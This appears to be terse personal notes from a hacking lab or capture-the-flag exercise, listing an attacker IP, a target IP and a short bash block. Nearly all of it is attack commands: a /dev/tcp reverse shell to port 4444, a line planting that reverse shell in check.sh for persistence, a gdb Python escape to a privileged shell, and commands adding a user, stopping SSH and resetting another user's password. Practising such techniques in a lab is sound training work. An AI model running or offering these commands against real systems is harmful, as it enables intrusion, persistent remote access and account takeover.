10.8.226.18


10.10.25.241

```bash

/bin/bash -l > /dev/tcp/10.8.226.18/4444 0<&1 2>&1
echo "/bin/bash -l > /dev/tcp/10.8.226.18/4444 0<&1 2>&1" >> check.sh

gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

adduser void

sudo service ssh stop

passwd shrek
```